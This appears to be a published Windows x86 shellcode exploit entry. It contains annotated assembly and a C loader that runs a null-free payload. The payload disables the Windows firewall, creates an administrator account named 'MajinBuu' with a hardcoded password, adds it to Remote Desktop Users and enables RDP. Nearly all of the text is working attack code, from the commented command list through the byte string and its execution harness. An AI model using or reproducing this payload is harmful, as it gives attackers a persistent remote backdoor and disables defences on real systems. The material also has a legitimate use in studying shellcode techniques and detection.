## Exploit Title: Windows/x86 - MSVCRT System + Dynamic Null-free + Add RDP Admin + Disable Firewall + Enable RDP Shellcode (644 Bytes)
## Exploit Author: Bobby Cooke
## Date: 2020-04-20
## Tested on:   Windows 10 Home - 1909 (x86_64), Windows 10 Pro - 1909 (x86)
## Description: Windows Shellcode that disables the Windows firewall, adds the user 'MajinBuu' with password 'TurnU2C@ndy!!' to the system, adds the user 'MajinBuu' to the local groups 'Administrators' & 'Remote Desktop Users', and then enables the RDP Service.
## Commands used:
##  'netsh firewall set opmode mode=DISABLE'
##  'net user MajinBuu TurnU2C@ndy!! /add'
##  'net localgroup Administrators MajinBuu /add'
##  'net localgroup "Remote Desktop Users" MajinBuu /add'
##  'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'

; Create stack frame
mov ebp, esp
sub esp, 0x30

; Find kernel32.dll base address
 xor ebx, ebx
 mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
 mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
 mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
 mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
 mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
 mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
 mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll

; Find the address of the Export Table within kernel32.dll
 mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader
 add ebx, eax            ; EBX = &NewEXEHeader
 mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable
 add ebx, eax            ; EBX = &ExportTable

; Find the address of the Name Pointer Table within kernel32.dll
 mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable
 add edi, eax            ; EDI = &NamePointerTable
 mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame

; Find the address of the Ordinal Table
 mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable
 add ecx, eax            ; ECX = &OrdinalTable
 mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame

; Find the address of the Address Table
 mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable
 add edx, eax            ; EDX = &AddressTable
 mov [ebp-0x10], edx     ; save &AddressTable to stack-frame

; Find Number of Functions within the Export Table of kernel32.dll
 mov edx, [ebx+0x14]     ; EDX = Number of Functions
 mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame

jmp short functions

findFunctionAddr:
; Initialize the Counter to prevent infinite loop
 xor eax, eax            ; EAX = Counter = 0
 mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
searchLoop:
 mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
 mov esi, [ebp-0x18]     ; ESI = Address of String for the Symbol we are searching for
 xor ecx, ecx            ; ECX = 0x00000000
 cld                     ; clear direction flag - Process strings from left to right
 mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
 add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
 add cx, 0xF             ; ECX = len("GetProcAddress,0x00") = 15 = 14 char + 1 Null
 repe cmpsb              ; compare first 8 bytes of [&NameString] to "GetProcAddress,0x00"
 jz found                ; If string at [&NameString] == "GetProcAddress,0x00", then end loop
 inc eax                 ; else Counter ++
 cmp eax, edx            ; Does EAX == Number of Functions?
 jb searchLoop           ;   If EAX != Number of Functions, then restart the loop

found:
; Find the address of GetProcAddress by using the last value of the Counter
 mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
 mov edx, [ebp-0x10]     ; EDX = &AddressTable
 mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber      = [&OrdinalTable + (Counter*2)]
 mov eax, [edx + eax*4]  ; EAX = RVA GetProcAddress = [&AddressTable + ordinalNumber]
 add eax, [ebp-0x4]      ; EAX = &GetProcAddress    = RVA GetProcAddress + &kernel32.dll
 ret

functions:
# Push string "GetProcAddress",0x00 onto the stack
 xor eax, eax            ; clear eax register
 mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
 push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"
 push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
 push 0x41636f72         ; Acor : 41636f72
 push 0x50746547         ; PteG : 50746547
 mov [ebp-0x18], esp      ; save PTR to string at bottom of stack (ebp)
 call findFunctionAddr   ; After Return EAX will = &GetProcAddress
# EAX = &GetProcAddress
 mov [ebp-0x1C], eax      ; save &GetProcAddress

; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
 xor edx, edx            ; EDX = 0x00000000
 push edx                ; null terminator for LoadLibraryA string
 push 0x41797261         ; Ayra : 41797261 // "LoadLibraryA",0x00
 push 0x7262694c         ; rbiL : 7262694c
 push 0x64616f4c         ; daoL : 64616f4c
 push esp                ; $hModule    -- push the address of the start of the string onto the stack
 push dword [ebp-0x4]    ; $lpProcName -- push base address of kernel32.dll to the stack
 mov eax, [ebp-0x1C]     ; Move the address of GetProcAddress into the EAX register
 call eax                ; Call the GetProcAddress Function.
 mov [ebp-0x20], eax     ; save Address of LoadLibraryA

; Call LoadLibraryA(PTR "msvcrt")
;   push "msvcrt",0x00 to the stack and save pointer
 xor eax, eax            ; clear eax
 mov ax, 0x7472          ; tr : 7472
 push eax
 push 0x6376736D         ; cvsm : 6376736D
 push esp                ; push the pointer to the string
 mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
 call ebx                ; call the LoadLibraryA Function to load msvcrt.dll
 mov [ebp-0x24], eax     ; save Address of msvcrt.dll

; Call GetProcAddress(msvcrt.dll, "system")
 xor edx, edx
 mov dx, 0x6d65          ; me : 6d65
 push edx
 push 0x74737973         ; tsys : 74737973
 push esp                ; push pointer to string to stack for 'system'
 push dword [ebp-0x24]   ; push base address of msvcrt.dll to stack
 mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
 call eax                ; GetProcAddress
;   EAX = WSAStartup Address
 mov [ebp-0x28], eax     ; save Address of msvcrt.system

; 'netsh firewall set opmode mode=DISABLE'
xor ecx, ecx
mov cx, 0x454c     ; EL : 454c
push ecx
push 0x42415349    ; BASI : 42415349
push 0x443d6564    ; D=ed : 443d6564
push 0x6f6d2065    ; om e : 6f6d2065
push 0x646f6d70    ; domp : 646f6d70
push 0x6f207465    ; o te : 6f207465
push 0x73206c6c    ; s ll : 73206c6c
push 0x61776572    ; awer : 61776572
push 0x69662068    ; if h : 69662068
push 0x7374656e    ; sten : 7374656e
push esp            ; push pointer to string
mov eax, [ebp-0x28] ; msvcrt.system address
call eax            ; call system

; 'net user MajinBuu TurnU2C@ndy!! /add'
xor ecx, ecx
push ecx
push 0x6464612f     ; dda/ : 6464612f
push 0x20212179     ;  !!y : 20212179
push 0x646e4043     ; dn@C : 646e4043
push 0x32556e72     ; 2Unr : 32556e72
push 0x75542075     ; uT u : 75542075
push 0x75426e69     ; uBni : 75426e69
push 0x6a614d20     ; jaM  : 6a614d20
push 0x72657375     ; resu : 72657375
push 0x2074656e     ;  ten : 2074656e
push esp            ; push pointer to string
mov eax, [ebp-0x28] ; msvcrt.system address
call eax            ; call system

; 'net localgroup Administrators MajinBuu /add'
xor ecx, ecx
push ecx
mov ecx, 0x64646190 ; dda : 646461
shr ecx, 8
push ecx
push 0x2f207575     ; / uu : 2f207575
push 0x426e696a     ; Bnij : 426e696a
push 0x614d2073     ; aM s : 614d2073
push 0x726f7461     ; rota : 726f7461
push 0x72747369     ; rtsi : 72747369
push 0x6e696d64     ; nimd : 6e696d64
push 0x41207075     ; A pu : 41207075
push 0x6f72676c     ; orgl : 6f72676c
push 0x61636f6c     ; acol : 61636f6c
push 0x2074656e     ;  ten : 2074656e
push esp            ; push pointer to string
mov eax, [ebp-0x28] ; msvcrt.system address
call eax            ; call system

; 'net localgroup "Remote Desktop Users" MajinBuu /add'
xor ecx, ecx
push ecx
mov ecx, 0x64646190 ; dda : 646461
shr ecx, 8
push ecx
push 0x2f207575     ; / uu : 2f207575
push 0x426e696a     ; Bnij : 426e696a
push 0x614d2022     ; aM " : 614d2022
push 0x73726573     ; sres : 73726573
push 0x5520706f     ; U po : 5520706f
push 0x746b7365     ; tkse : 746b7365
push 0x44206574     ; D et : 44206574
push 0x6f6d6552     ; omeR : 6f6d6552
push 0x22207075     ; " pu : 22207075
push 0x6f72676c     ; orgl : 6f72676c
push 0x61636f6c     ; acol : 61636f6c
push 0x2074656e     ;  ten : 2074656e
push esp            ; push pointer to string
mov eax, [ebp-0x28] ; msvcrt.system address
call eax            ; call system

; 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
xor ecx, ecx
push ecx
push 0x662f2030    ; f/ 0 : 662f2030
push 0x20642f20    ;  d/  : 20642f20
push 0x44524f57    ; DROW : 44524f57
push 0x445f4745    ; D_GE : 445f4745
push 0x5220742f    ; R t/ : 5220742f
push 0x20736e6f    ;  sno : 20736e6f
push 0x69746365    ; itce : 69746365
push 0x6e6e6f43    ; nnoC : 6e6e6f43
push 0x5354796e    ; STyn : 5354796e
push 0x65446620    ; eDf  : 65446620
push 0x762f2022    ; v/ " : 762f2022
push 0x72657672    ; revr : 72657672
push 0x6553206c    ; eS l : 6553206c
push 0x616e696d    ; anim : 616e696d
push 0x7265545c    ; reT\ : 7265545c
push 0x6c6f7274    ; lort : 6c6f7274
push 0x6e6f435c    ; noC\ : 6e6f435c
push 0x7465536c    ; teSl : 7465536c
push 0x6f72746e    ; ortn : 6f72746e
push 0x6f43746e    ; oCtn : 6f43746e
push 0x65727275    ; erru : 65727275
push 0x435c4d45    ; C\ME : 435c4d45
push 0x54535953    ; TSYS : 54535953
push 0x5c454e49    ; \ENI : 5c454e49
push 0x4843414d    ; HCAM : 4843414d
push 0x5f4c4143    ; _LAC : 5f4c4143
push 0x4f4c5f59    ; OL_Y : 4f4c5f59
push 0x454b4822    ; EKH" : 454b4822
push 0x20646461    ;  dda : 20646461
push 0x20676572    ;  ger : 20676572
push esp            ; push pointer to string
mov eax, [ebp-0x28] ; msvcrt.system address
call eax            ; call system


######################################################################################
#include <windows.h>
#include <stdio.h>

char code[] = \
"\x89\xe5\x83\xec\x30\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b"
"\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7"
"\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53"
"\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\xe8\x31\xc9\xfc\x8b"
"\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x0f\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4"
"\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\x31\xc0\x66\xb8\x73\x73\x50"
"\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x89\x65\xe8\xe8\xb0\xff"
"\xff\xff\x89\x45\xe4\x31\xd2\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f"
"\x61\x64\x54\xff\x75\xfc\x8b\x45\xe4\xff\xd0\x89\x45\xe0\x31\xc0\x66\xb8\x72\x74\x50"
"\x68\x6d\x73\x76\x63\x54\x8b\x5d\xe0\xff\xd3\x89\x45\xdc\x31\xd2\x66\xba\x65\x6d\x52"
"\x68\x73\x79\x73\x74\x54\xff\x75\xdc\x8b\x45\xe4\xff\xd0\x89\x45\xd8\x31\xc9\x66\xb9"
"\x4c\x45\x51\x68\x49\x53\x41\x42\x68\x64\x65\x3d\x44\x68\x65\x20\x6d\x6f\x68\x70\x6d"
"\x6f\x64\x68\x65\x74\x20\x6f\x68\x6c\x6c\x20\x73\x68\x72\x65\x77\x61\x68\x68\x20\x66"
"\x69\x68\x6e\x65\x74\x73\x54\x8b\x45\xd8\xff\xd0\x31\xc9\x51\x68\x2f\x61\x64\x64\x68"
"\x79\x21\x21\x20\x68\x43\x40\x6e\x64\x68\x72\x6e\x55\x32\x68\x75\x20\x54\x75\x68\x69"
"\x6e\x42\x75\x68\x20\x4d\x61\x6a\x68\x75\x73\x65\x72\x68\x6e\x65\x74\x20\x54\x8b\x45"
"\xd8\xff\xd0\x31\xc9\x51\xb9\x90\x61\x64\x64\xc1\xe9\x08\x51\x68\x75\x75\x20\x2f\x68"
"\x6a\x69\x6e\x42\x68\x73\x20\x4d\x61\x68\x61\x74\x6f\x72\x68\x69\x73\x74\x72\x68\x64"
"\x6d\x69\x6e\x68\x75\x70\x20\x41\x68\x6c\x67\x72\x6f\x68\x6c\x6f\x63\x61\x68\x6e\x65"
"\x74\x20\x54\x8b\x45\xd8\xff\xd0\x31\xc9\x51\xb9\x90\x61\x64\x64\xc1\xe9\x08\x51\x68"
"\x75\x75\x20\x2f\x68\x6a\x69\x6e\x42\x68\x22\x20\x4d\x61\x68\x73\x65\x72\x73\x68\x6f"
"\x70\x20\x55\x68\x65\x73\x6b\x74\x68\x74\x65\x20\x44\x68\x52\x65\x6d\x6f\x68\x75\x70"
"\x20\x22\x68\x6c\x67\x72\x6f\x68\x6c\x6f\x63\x61\x68\x6e\x65\x74\x20\x54\x8b\x45\xd8"
"\xff\xd0\x31\xc9\x51\x68\x30\x20\x2f\x66\x68\x20\x2f\x64\x20\x68\x57\x4f\x52\x44\x68"
"\x45\x47\x5f\x44\x68\x2f\x74\x20\x52\x68\x6f\x6e\x73\x20\x68\x65\x63\x74\x69\x68\x43"
"\x6f\x6e\x6e\x68\x6e\x79\x54\x53\x68\x20\x66\x44\x65\x68\x22\x20\x2f\x76\x68\x72\x76"
"\x65\x72\x68\x6c\x20\x53\x65\x68\x6d\x69\x6e\x61\x68\x5c\x54\x65\x72\x68\x74\x72\x6f"
"\x6c\x68\x5c\x43\x6f\x6e\x68\x6c\x53\x65\x74\x68\x6e\x74\x72\x6f\x68\x6e\x74\x43\x6f"
"\x68\x75\x72\x72\x65\x68\x45\x4d\x5c\x43\x68\x53\x59\x53\x54\x68\x49\x4e\x45\x5c\x68"
"\x4d\x41\x43\x48\x68\x43\x41\x4c\x5f\x68\x59\x5f\x4c\x4f\x68\x22\x48\x4b\x45\x68\x61"
"\x64\x64\x20\x68\x72\x65\x67\x20\x54\x8b\x45\xd8\xff\xd0";

int main(int argc, char **argv)
{
  int (*func)();
  func = (int(*)()) code;
  (int)(*func)();
}